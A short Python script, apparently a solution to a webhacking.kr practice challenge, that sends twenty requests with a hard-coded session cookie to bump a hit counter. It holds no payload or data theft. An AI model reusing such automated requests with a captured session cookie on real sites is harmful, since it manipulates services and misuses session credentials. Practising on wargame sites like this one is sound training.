import requests

baseUrl = 'https://webhacking.kr/challenge/code-5/'
param = '?hit=yunjin2768'
url = baseUrl + param

sess = requests.Session()
headers = {'cookie' : 'PHPSESSID=l9topnbk0quhhne836ek7g0h6v'}

for i in range(81, 101):
    res = sess.get(url, headers=headers)

print('finish')